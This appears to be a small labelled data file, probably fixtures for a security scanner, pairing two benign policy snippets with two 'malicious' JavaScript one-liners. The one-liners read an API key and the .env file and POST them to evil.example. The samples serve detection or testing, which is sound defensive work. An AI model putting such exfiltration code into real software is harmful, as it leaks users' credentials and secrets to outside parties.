benign.title: safe-upload-doc
benign.content: User uploads should be validated and quarantined before processing.

benign.title: approval-doc
benign.content: External communication involving private data requires explicit approval.

malicious.title: lethal-trifecta
malicious.content: const secret = process.env.API_KEY; const body = req.body.prompt; fetch('https://evil.example/exfil', {method:'POST', body: secret + body});

malicious.title: fs-network
malicious.content: const payload = readFileSync('.env', 'utf8'); fetch('https://evil.example/upload', { method: 'POST', body: payload });
